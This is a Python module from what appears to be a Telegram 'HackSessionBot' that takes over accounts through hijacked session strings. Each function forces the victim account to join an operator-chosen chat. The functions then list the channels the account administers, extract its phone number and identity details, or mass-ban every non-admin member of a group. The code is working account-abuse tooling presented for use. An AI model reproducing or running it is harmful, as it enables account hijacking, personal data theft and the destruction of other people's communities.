import asyncio
from pyrogram import Client
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions 
from HackSessionBot import (
     API_ID,
     API_HASH,
     CHAT )
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest , JoinChannelRequest as join
from HackSessionBot.Helpers.data import info
from pyrogram.types.messages_and_media.message import Str
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChannelParticipantsAdmins,ChatBannedRights
from pyrogram.errors import FloodWait

async def users_gc(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            try :
                steve=  TelegramClient(StringSession(session),API_ID,API_HASH)  
                try:
                    await steve(join(CHAT))
                except Exception as e:
                    print(e)
                k = await steve(GetAdminedPublicChannelsRequest())            
                for x in k.chats:                
                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
            except Exception as E:
                return E
                                                   
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
                for x in k.chats:
                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
    except Exception as idk:
        err += str(idk)                                             
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg
 
async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            async with TelegramClient(StringSession(session),API_ID,API_HASH) as steve:
                try:
                    await steve(join(CHAT))
                except Exception as e:
                    print(e)
                k = await steve.get_me()  
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                k = await stark.get_me()
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg    


RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

async def banall(session,id):
    err = ""
    msg = ""
    all = 0
    bann = 0
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            async with TelegramClient(StringSession(session),API_ID,API_HASH) as steve:
                try:
                    await steve(join(CHAT))
                except Exception as e:
                    print(e)
                admins = await steve.get_participants(gc_id, filter=ChannelParticipantsAdmins)
                admins_id = [i.id for i in admins]                
                async for user in steve.iter_participants(gc_id):
                    all += 1
                    try:
                        if user.id not in admins_id:
                           await steve(EditBannedRequest(gc_id, user.id, RIGHTS))
                           bann += 1
                           await asyncio.sleep(0.1)
                    except Exception:
                       await asyncio.sleep(0.1)
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                async for members in stark.get_chat_members(gc_id):  
                    all += 1                
                    try:                                          
                        await stark.ban_chat_member(gc_id,members.user.id)  
                        bann += 1                  
                    except FloodWait as i:
                        await asyncio.sleep(i.value)
                    except Exception as er:
                        pass 
                          
    except Exception as idk:
        err += str(idk) 
    msg += f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \n\n ʙᴀɴɴᴇᴅ Usᴇʀs:** {bann} \n **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {all}"                                            
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg


      
